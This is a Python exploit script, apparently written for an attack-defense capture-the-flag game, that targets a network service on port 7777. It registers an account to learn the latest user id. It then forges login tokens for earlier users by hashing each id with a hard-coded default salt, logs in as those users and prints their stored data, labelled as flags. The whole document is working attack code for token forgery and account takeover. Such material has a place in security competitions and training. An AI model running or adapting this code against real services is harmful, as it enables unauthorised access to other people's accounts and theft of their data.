#!/usr/bin/python3 
# This exploit relies on team not changing the salt.
import hashlib
import socket
import time

TOKEN = "CMC3BFF"

def get_hash(user_id):
  sha = hashlib.sha256()
  sha.update((str(user_id) + TOKEN).encode('ascii'))
  return sha.hexdigest()[:32]

import sys
import hashlib
ip = sys.argv[1]
PORT = 7777
RECV_TIME = 0.1

# Registering a new user to get last user_id
sock = socket.socket()
sock.connect((ip, PORT))
time.sleep(RECV_TIME)
sock.recv(4096)
sock.send('register\n'.encode('ascii'))
time.sleep(RECV_TIME)
data = sock.recv(4096).decode('ascii')
sock.close()
id = data[data.find('id =')+4:]
id = id[:id.find('\n')].strip()
id = int(id)
token = data[data.find('en =')+4:]
token = token[:token.find('\n')].strip()
if token != get_hash(id):
  # Team changed default token or hash logic, moving on.
  exit(0)
for i in range(id-1, max(1, id - 11), -1):
  sock = socket.socket()
  sock.connect((ip, PORT))
  time.sleep(RECV_TIME)
  sock.recv(4096)
  sock.send(('login\n%d\n%s\n' % (i, get_hash(i))).encode('ascii'))
  time.sleep(RECV_TIME)
  if not 'Login completed' in sock.recv(4096).decode('ascii'):
    # Something went wrong.
    sock.close()
    continue
  sock.send(('get_data\n%d\n' % i).encode('ascii'))
  time.sleep(RECV_TIME)
  # Flags will be somewhere in stdout.
  print(sock.recv(4096).decode('ascii'))
  sock.close()
